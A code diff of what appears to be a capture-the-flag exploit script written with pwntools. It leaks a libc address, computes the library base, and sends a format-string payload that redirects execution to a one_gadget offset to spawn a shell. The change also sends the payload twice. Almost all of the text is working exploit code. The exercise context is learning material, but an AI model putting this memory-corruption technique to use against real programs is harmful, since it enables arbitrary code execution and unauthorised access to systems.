@@ -94,8 +94,8 @@ def main():
     # Following line from writeup --- attempted this my way and would always crash, or the offset wouldn't be the start of libc which was annoying
     libcLeak = u64(runningProc.recvuntil('\x7f').ljust(8, b'\x00'))  # Grab up to this byte, then grab until termination, tried this like above and wouldn't work
     print("LIBC LEAK ADDR: ", libcLeak)
-    startLibc = libcLeak - libc.sym[leak_func]
-    print("START LIBC: ", hex(startLibc))
+    libc.address = libcLeak - libc.sym[leak_func]
+    print("START LIBC: ", hex(libc.address))
 
     # Attempt to launch shell
     # Recapture the leaks again
@@ -135,9 +135,10 @@ def main():
     [rsi] == NULL || rsi == NULL
     [rdx] == NULL || rdx == NULL
     '''
-    oneGadgetOffset = 0xe3b34
-    popShell = libc.address + oneGadgetOffset   # Since offset can find by adding to libc start
-    payload = fmtstr_payload(offset, {InstrPtr: popShell})  # Pack payload
+
+    onegadget = libc.address + 0xe3b31
+    payload = fmtstr_payload(offset, {InstrPtr: onegadget})
+    runningProc.sendline(payload)
 
     # See if get shell!
     runningProc.sendline(payload)
